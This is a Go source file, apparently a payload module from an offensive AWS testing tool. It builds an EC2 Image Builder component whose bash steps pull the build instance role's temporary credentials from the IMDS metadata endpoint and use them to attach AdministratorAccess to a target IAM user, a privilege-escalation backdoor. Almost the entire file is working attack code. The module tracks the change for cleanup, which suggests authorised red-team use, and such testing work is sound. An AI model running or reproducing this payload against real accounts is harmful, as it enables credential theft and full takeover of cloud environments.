package imagebuilder

import (
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// BackdoorAttachPolicyPayload generates an EC2 Image Builder component document
// containing shell commands that retrieve admin credentials from IMDS and attach
// a policy to a target IAM user. The commands run on the build EC2 instance during
// the Image Builder pipeline execution.
type BackdoorAttachPolicyPayload struct{}

func NewBackdoorAttachPolicyPayload() *BackdoorAttachPolicyPayload {
	return &BackdoorAttachPolicyPayload{}
}

func init() {
	payloads.Register(NewBackdoorAttachPolicyPayload())
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess to an IAM user via EC2 Image Builder component using IMDS credentials"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceImageBuilder,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to attach policy to (auto-populated from current identity)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "ARN of the policy to attach (default: AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

// GenerateCode produces an Image Builder component YAML document.
// The YAML contains ExecuteBash steps that retrieve temporary credentials
// from the IMDS endpoint on the build EC2 instance and attach the target policy.
// The TARGET_USER value is embedded at generation time (not via environment variable)
// because Image Builder component documents do not support dynamic parameter injection
// the way Lambda environment variables do.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := options["TARGET_USER"]
	if targetUser == "" {
		return "", fmt.Errorf("TARGET_USER is required")
	}

	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	// Extract plain username from ARN if provided as ARN
	username := targetUser
	if strings.HasPrefix(targetUser, "arn:") {
		if idx := strings.LastIndex(targetUser, "/"); idx != -1 {
			username = targetUser[idx+1:]
		}
	}

	// Generate the component YAML document. Values are embedded at creation time
	// rather than read from environment variables because Image Builder does not
	// support dynamic parameter substitution in ExecuteBash commands the same way.
	componentDoc := fmt.Sprintf(`name: PathrunnerExploit
schemaVersion: 1.0
phases:
  - name: build
    steps:
      - name: Exploit
        action: ExecuteBash
        inputs:
          commands:
            - |
              echo "=== Pathrunner Image Builder Exploit Component ==="
              echo "Target user: %s"
              echo "Policy: %s"

              # Retrieve IMDSv2 token
              TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
                -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
              if [ -z "$TOKEN" ]; then
                echo "FAILED: Could not retrieve IMDSv2 token"
                exit 1
              fi

              # Discover the instance role name from IMDS
              ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
                http://169.254.169.254/latest/meta-data/iam/security-credentials/)
              if [ -z "$ROLE_NAME" ]; then
                echo "FAILED: No IAM role found on this instance"
                exit 1
              fi
              echo "Instance role: $ROLE_NAME"

              # Retrieve temporary credentials from IMDS
              CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")
              export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
              export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
              export AWS_SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['Token'])")
              echo "Credentials loaded (prefix: ${AWS_ACCESS_KEY_ID:0:10}...)"

              # Verify caller identity using the instance role credentials
              aws sts get-caller-identity 2>&1

              # Attach the target policy to the starting user
              echo "Attaching %s to user %s ..."
              if aws iam attach-user-policy \
                  --user-name "%s" \
                  --policy-arn "%s" 2>&1; then
                echo "SUCCESS: Policy attached to %s"
              else
                echo "FAILED: Could not attach policy"
                exit 1
              fi
`, username, policyArn, policyArn, username, username, policyArn, username)

	return componentDoc, nil
}

// ProcessResult formats the module result after the image build completes.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// Validate checks that required options are present.
func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
	}
	return nil
}

// ReportSideEffects returns the policy attachment as a tracked modification so
// the workspace cleanup system can reverse it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := options["TARGET_USER"]
	username := targetUser
	if strings.HasPrefix(targetUser, "arn:") {
		if idx := strings.LastIndex(targetUser, "/"); idx != -1 {
			username = targetUser[idx+1:]
		}
	}

	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", username, "AdministratorAccess"),
			ARN:           policyArn,
			CleanupMethod: "iam:DetachUserPolicy",
			Metadata: map[string]string{
				"principal_type": "user",
				"principal_name": username,
				"policy_arn":     policyArn,
			},
		},
	}
}
